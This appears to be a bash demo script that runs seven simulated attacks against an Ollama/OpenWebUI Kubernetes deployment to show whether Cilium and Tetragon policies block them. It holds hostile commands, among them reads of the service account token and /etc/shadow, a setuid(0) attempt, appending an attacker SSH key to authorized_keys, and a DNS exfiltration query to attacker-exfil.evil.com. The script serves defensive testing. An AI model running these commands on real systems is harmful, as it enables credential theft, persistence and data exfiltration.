#!/bin/bash
# =============================================================================
# KPH LLM Security Demo - Attack Simulations
# =============================================================================
# This script demonstrates various attack vectors against unprotected LLM
# infrastructure. Run this BEFORE applying security policies to show 
# vulnerabilities, then run again AFTER to show policies blocking attacks.
#
# Usage: ./demo-attacks.sh [attack-name]
#        ./demo-attacks.sh all
# =============================================================================

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

log_attack() { echo -e "${RED}[ATTACK]${NC} $1"; }
log_result() { echo -e "${PURPLE}[RESULT]${NC} $1"; }
log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }

# =============================================================================
# Attack 1: Lateral Movement to Infrastructure Services
# =============================================================================
# Simulates an attacker attempting to access infrastructure services they
# shouldn't be able to reach (metrics-server, monitoring, kube-system services)
# =============================================================================
attack_egress_exfiltration() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 1: Lateral Movement to Infrastructure Services"
    echo "============================================================="
    echo ""
    log_info "Scenario: An attacker with code execution attempts to access"
    log_info "cluster infrastructure services for reconnaissance and lateral movement."
    echo ""

    OLLAMA_POD=$(kubectl -n llm-system get pod -l app=ollama -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")

    if [ -z "$OLLAMA_POD" ]; then
        log_result "Ollama pod not found. Deploy the LLM stack first."
        return 1
    fi

    # Attack 1a: Try to access metrics-server (cluster reconnaissance)
    log_info "1a: Attempting to access metrics-server in kube-system..."
    echo ""
    echo "Command: Connect to metrics-server.kube-system.svc:443"
    log_info "Impact: Attacker could enumerate all pods and resource usage"
    echo ""

    if kubectl -n llm-system exec "$OLLAMA_POD" -- bash -c 'timeout 3 bash -c "echo > /dev/tcp/metrics-server.kube-system.svc.cluster.local/443" 2>/dev/null && echo "Connection established"' 2>/dev/null | grep -q "Connection established"; then
        echo "Connection established"
        log_result "⚠️  VULNERABLE: Metrics-server access SUCCEEDED"
        log_result "Attacker could enumerate pods, gather cluster intelligence!"
    else
        echo ""
        log_result "✅ BLOCKED: Metrics-server access was blocked by network policy"
    fi

    echo ""

    # Attack 1b: Try to access CoreDNS directly (DNS infrastructure tampering)
    log_info "1b: Attempting direct access to CoreDNS pods in kube-system..."
    echo ""
    echo "Command: Connect to kube-dns.kube-system.svc:53 (TCP)"
    log_info "Impact: Attacker could attempt DNS poisoning or zone transfers"
    echo ""

    if kubectl -n llm-system exec "$OLLAMA_POD" -- bash -c 'timeout 3 bash -c "echo > /dev/tcp/kube-dns.kube-system.svc.cluster.local/53" 2>/dev/null && echo "Connection established"' 2>/dev/null | grep -q "Connection established"; then
        echo "Connection established"
        log_result "⚠️  VULNERABLE: Direct CoreDNS access SUCCEEDED"
        log_result "Attacker could attempt DNS infrastructure attacks!"
    else
        echo ""
        log_result "✅ BLOCKED: CoreDNS access was blocked by network policy"
    fi

    echo ""

    # Attack 1c: Try to access Tetragon metrics (security monitoring evasion)
    log_info "1c: Attempting to access Tetragon metrics in kube-system..."
    echo ""
    echo "Command: Connect to tetragon-operator-metrics.kube-system.svc:2113"
    log_info "Impact: Attacker could probe security monitoring for evasion"
    echo ""

    if kubectl -n llm-system exec "$OLLAMA_POD" -- bash -c 'timeout 3 bash -c "echo > /dev/tcp/tetragon-operator-metrics.kube-system.svc.cluster.local/2113" 2>/dev/null && echo "Connection established"' 2>/dev/null | grep -q "Connection established"; then
        echo "Connection established"
        log_result "⚠️  VULNERABLE: Tetragon metrics access SUCCEEDED"
        log_result "Attacker could probe security monitoring capabilities!"
    else
        echo ""
        log_result "✅ BLOCKED: Tetragon metrics access was blocked by network policy"
    fi
}

# =============================================================================
# Attack 2: Shell Execution (RCE)
# =============================================================================
# Simulates an attacker achieving code execution and trying to spawn a shell
# =============================================================================
attack_shell_execution() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 2: Shell Execution (RCE Simulation)"
    echo "============================================================="
    echo ""
    log_info "Scenario: An attacker exploits CVE-2025-64496 or similar to"
    log_info "achieve code execution and tries to spawn a shell."
    echo ""
    log_info "Attempting to spawn /bin/sh in Ollama pod..."
    echo ""

    OLLAMA_POD=$(kubectl -n llm-system get pod -l app=ollama -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
    
    if [ -z "$OLLAMA_POD" ]; then
        log_result "Ollama pod not found. Deploy the LLM stack first."
        return 1
    fi

    echo "Command: /bin/sh -c 'echo Shell spawned successfully; whoami; id'"
    echo ""
    
    # Try to spawn a shell and run commands
    if kubectl -n llm-system exec "$OLLAMA_POD" -- /bin/sh -c 'echo "Shell spawned successfully"; whoami; id' 2>/dev/null; then
        echo ""
        log_result "⚠️  VULNERABLE: Shell execution SUCCEEDED"
        log_result "Attacker could install persistence, pivot, or exfiltrate data!"
    else
        echo ""
        log_result "✅ BLOCKED: Shell execution was killed by Tetragon"
    fi
}

# =============================================================================
# Attack 3: Interpreter-Based Reverse Shell (Shell Bypass)
# =============================================================================
# Simulates an attacker bypassing shell blocking by using perl/python/ruby
# to establish a reverse shell - a common technique when /bin/sh is blocked
# =============================================================================
attack_interpreter_shell() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 3: Interpreter-Based Reverse Shell (Shell Bypass)"
    echo "============================================================="
    echo ""
    log_info "Scenario: An attacker discovers /bin/sh is blocked by Tetragon."
    log_info "They bypass this by using perl to spawn a reverse shell instead."
    log_info "This is a common attacker technique when shells are restricted."
    echo ""

    OLLAMA_POD=$(kubectl -n llm-system get pod -l app=ollama -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")

    if [ -z "$OLLAMA_POD" ]; then
        log_result "Ollama pod not found. Deploy the LLM stack first."
        return 1
    fi

    # First show that bash is blocked
    log_info "3a: Confirming bash is blocked..."
    echo ""
    echo "Command: /bin/bash -c 'echo test'"
    echo ""

    if kubectl -n llm-system exec "$OLLAMA_POD" -- /bin/bash -c 'echo "bash executed"' 2>/dev/null; then
        log_result "⚠️  bash is NOT blocked"
    else
        log_result "✅ bash is blocked by Tetragon (as expected)"
    fi

    echo ""

    # Now show perl bypass
    log_info "3b: Attempting perl reverse shell bypass..."
    echo ""
    echo "Command: perl -e 'print \"Reverse shell simulation - attacker has code execution\\n\"'"
    log_info "Impact: Attacker bypasses shell blocking using interpreter!"
    echo ""

    if kubectl -n llm-system exec "$OLLAMA_POD" -- perl -e 'print "Perl executed - reverse shell would connect to attacker\n"; print "Attacker now has interactive access!\n"' 2>/dev/null; then
        echo ""
        log_result "⚠️  VULNERABLE: Perl execution SUCCEEDED (shell bypass works!)"
        log_result "Attacker could use: perl -e 'use Socket;...' for full reverse shell"
    else
        echo ""
        log_result "✅ BLOCKED: Perl interpreter was killed by Tetragon"
    fi
}

# =============================================================================
# Attack 4: DNS Exfiltration
# =============================================================================
# Simulates data exfiltration via DNS queries
# =============================================================================
attack_dns_exfiltration() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 4: DNS Exfiltration"
    echo "============================================================="
    echo ""
    log_info "Scenario: An attacker encodes stolen data in DNS queries to"
    log_info "an attacker-controlled nameserver, bypassing HTTP egress blocks."
    echo ""

    OLLAMA_POD=$(kubectl -n llm-system get pod -l app=ollama -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")

    if [ -z "$OLLAMA_POD" ]; then
        log_result "Ollama pod not found. Deploy the LLM stack first."
        return 1
    fi

    # Simulated exfiltration: encode data as subdomain
    ENCODED_DATA="c2VjcmV0X2RhdGE"  # base64 of "secret_data"
    EXFIL_DOMAIN="${ENCODED_DATA}.attacker-exfil.evil.com"

    echo "Command: getent hosts ${EXFIL_DOMAIN}"
    log_info "Impact: Data encoded in DNS subdomain sent to attacker's nameserver"
    echo ""

    # Use getent which is available in most containers (nslookup often isn't)
    if kubectl -n llm-system exec "$OLLAMA_POD" -- getent hosts "${EXFIL_DOMAIN}" 2>/dev/null; then
        echo ""
        log_result "⚠️  VULNERABLE: External DNS query SUCCEEDED"
        log_result "Data could be exfiltrated via DNS tunneling!"
    else
        echo ""
        log_result "✅ BLOCKED: External DNS was blocked by Cilium DNS policy"
    fi
}

# =============================================================================
# Attack 5: Unauthorized Ollama API Access
# =============================================================================
# Simulates direct access to the Ollama API from an unauthorized source
# =============================================================================
attack_api_exposure() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 5: Unauthorized Ollama API Access"
    echo "============================================================="
    echo ""
    log_info "Scenario: An attacker pod in another namespace tries to"
    log_info "directly access the Ollama API (model theft, resource hijacking)."
    echo ""

    # Create an attacker pod in the default namespace
    log_info "Creating attacker pod in default namespace..."
    
    kubectl run attacker-pod --image=curlimages/curl --restart=Never --rm -it --command -- \
        curl -s --connect-timeout 5 http://ollama.llm-system.svc.cluster.local:11434/api/tags 2>/dev/null && {
        echo ""
        log_result "⚠️  VULNERABLE: Unauthorized API access SUCCEEDED"
        log_result "Attacker could steal models or hijack inference resources!"
    } || {
        echo ""
        log_result "✅ BLOCKED: Unauthorized API access was blocked by network policy"
    }
}

# =============================================================================
# Attack 6: Cross-Namespace Communication
# =============================================================================
# Simulates unauthorized pod-to-pod communication
# =============================================================================
attack_cross_namespace() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 6: Cross-Namespace Pod Communication"
    echo "============================================================="
    echo ""
    log_info "Scenario: A compromised pod in another namespace tries to"
    log_info "communicate directly with OpenWebUI backend, bypassing NGF."
    echo ""

    # Try to access OpenWebUI from default namespace (should go through NGF)
    log_info "Attempting to access OpenWebUI from unauthorized namespace..."
    echo ""
    
    kubectl run bypass-test --image=curlimages/curl --restart=Never --rm -it --command -- \
        curl -s --connect-timeout 5 http://openwebui.llm-frontend.svc.cluster.local:8080/health 2>/dev/null && {
        echo ""
        log_result "⚠️  VULNERABLE: Direct backend access SUCCEEDED (bypassing NGF)"
        log_result "Attacker could bypass NGF security controls!"
    } || {
        echo ""
        log_result "✅ BLOCKED: Direct backend access was blocked by network policy"
    }
}

# =============================================================================
# Attack 7: Privilege Escalation (Tetragon-blockable)
# =============================================================================
# Simulates privilege escalation attempts that Tetragon TracingPolicies can
# detect and block: sensitive file reads, privesc syscalls, and persistence
# =============================================================================
attack_privilege_escalation() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 7: Privilege Escalation (Sensitive Files & Syscalls)"
    echo "============================================================="
    echo ""
    log_info "Scenario: An attacker with code execution attempts to escalate"
    log_info "privileges by reading secrets, using privesc syscalls, or"
    log_info "establishing persistence."
    echo ""

    OLLAMA_POD=$(kubectl -n llm-system get pod -l app=ollama -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")

    if [ -z "$OLLAMA_POD" ]; then
        log_result "Ollama pod not found. Deploy the LLM stack first."
        return 1
    fi

    # Attack 7a: Read Kubernetes Service Account Token
    log_info "7a: Attempting to read Kubernetes service account token..."
    echo ""
    echo "Command: cat /var/run/secrets/kubernetes.io/serviceaccount/token"
    echo ""

    if kubectl -n llm-system exec "$OLLAMA_POD" -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 50; then
        echo "..."
        echo ""
        log_result "⚠️  VULNERABLE: Service account token read SUCCEEDED"
        log_result "Attacker could use token to access Kubernetes API!"
    else
        echo ""
        log_result "✅ BLOCKED: Token read was killed by Tetragon file policy"
    fi

    echo ""

    # Attack 7b: Read /etc/shadow (credential harvesting)
    log_info "7b: Attempting to read /etc/shadow..."
    echo ""
    echo "Command: cat /etc/shadow"
    echo ""

    if kubectl -n llm-system exec "$OLLAMA_POD" -- cat /etc/shadow 2>/dev/null | head -3; then
        echo ""
        log_result "⚠️  VULNERABLE: /etc/shadow read SUCCEEDED"
        log_result "Attacker could crack password hashes!"
    else
        echo ""
        log_result "✅ BLOCKED: /etc/shadow read was blocked by Tetragon"
    fi

    echo ""

    # Attack 7c: Attempt setuid syscall (privilege escalation)
    log_info "7c: Attempting setuid syscall to escalate to root..."
    echo ""
    echo "Command: python3 -c 'import os; os.setuid(0); print(\"setuid succeeded\")'"
    echo ""

    if kubectl -n llm-system exec "$OLLAMA_POD" -- python3 -c 'import os; os.setuid(0); print("setuid(0) succeeded - now root")' 2>/dev/null; then
        echo ""
        log_result "⚠️  VULNERABLE: setuid syscall SUCCEEDED"
        log_result "Attacker could escalate privileges!"
    else
        echo ""
        log_result "✅ BLOCKED: setuid syscall was killed by Tetragon"
    fi

    echo ""

    # Attack 7d: Write SSH key for persistence
    log_info "7d: Attempting to write SSH key for persistence..."
    echo ""
    echo "Command: echo 'ssh-rsa ATTACKER_KEY' >> /root/.ssh/authorized_keys"
    echo ""

    if kubectl -n llm-system exec "$OLLAMA_POD" -- /bin/sh -c 'mkdir -p /root/.ssh && echo "ssh-rsa AAAA_ATTACKER_KEY attacker@evil" >> /root/.ssh/authorized_keys && echo "SSH key written"' 2>/dev/null; then
        echo ""
        log_result "⚠️  VULNERABLE: SSH key persistence SUCCEEDED"
        log_result "Attacker has persistent backdoor access!"
        # Clean up
        kubectl -n llm-system exec "$OLLAMA_POD" -- rm -f /root/.ssh/authorized_keys 2>/dev/null || true
    else
        echo ""
        log_result "✅ BLOCKED: Write to /root/.ssh was killed by Tetragon"
    fi
}

# =============================================================================
# Run All Attacks
# =============================================================================
run_all_attacks() {
    echo ""
    echo "============================================================="
    echo "  KPH LLM Security Demo - Running All Attack Simulations"
    echo "============================================================="
    
    attack_egress_exfiltration
    attack_shell_execution
    attack_interpreter_shell
    attack_dns_exfiltration
    attack_api_exposure
    attack_cross_namespace
    attack_privilege_escalation

    echo ""
    echo "============================================================="
    echo "  Attack Simulation Complete"
    echo "============================================================="
    echo ""
    echo "If attacks succeeded (marked ⚠️  VULNERABLE), run:"
    echo "  ./apply-policies.sh"
    echo ""
    echo "Then re-run this script to see attacks blocked."
    echo ""
}

# =============================================================================
# Run Single Attack by Name or Number
# =============================================================================
run_attack() {
    case "$1" in
        1|egress)
            attack_egress_exfiltration
            ;;
        2|shell)
            attack_shell_execution
            ;;
        3|interpreter|perl)
            attack_interpreter_shell
            ;;
        4|dns)
            attack_dns_exfiltration
            ;;
        5|api)
            attack_api_exposure
            ;;
        6|cross)
            attack_cross_namespace
            ;;
        7|privesc)
            attack_privilege_escalation
            ;;
        all)
            run_all_attacks
            ;;
        *)
            echo "Unknown attack: $1"
            return 1
            ;;
    esac
}

# =============================================================================
# Main
# =============================================================================
show_usage() {
    echo "Usage: $0 [attack ...] "
    echo ""
    echo "Run specific attacks by number or name:"
    echo "  $0 1 4          # Run attacks 1 and 4"
    echo "  $0 2 3          # Run attacks 2 and 3"
    echo "  $0 5 6 7        # Run attacks 5, 6, and 7"
    echo "  $0 egress dns   # Run by name"
    echo "  $0 all          # Run all attacks"
    echo ""
    echo "Available attacks:"
    echo "  1, egress      - Lateral Movement to Infrastructure Services"
    echo "  2, shell       - Shell Execution (RCE)"
    echo "  3, interpreter - Interpreter-Based Reverse Shell"
    echo "  4, dns         - DNS Exfiltration"
    echo "  5, api         - Unauthorized Ollama API Access"
    echo "  6, cross       - Cross-Namespace Communication"
    echo "  7, privesc     - Privilege Escalation"
    echo "  all            - Run all attacks"
}

main() {
    if [ $# -eq 0 ]; then
        show_usage
        exit 0
    fi

    # Check for help flag
    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
        show_usage
        exit 0
    fi

    # Run each specified attack
    for attack in "$@"; do
        run_attack "$attack"
    done

    echo ""
    echo "============================================================="
    echo "  Attack Simulation Complete"
    echo "============================================================="
}

main "$@"
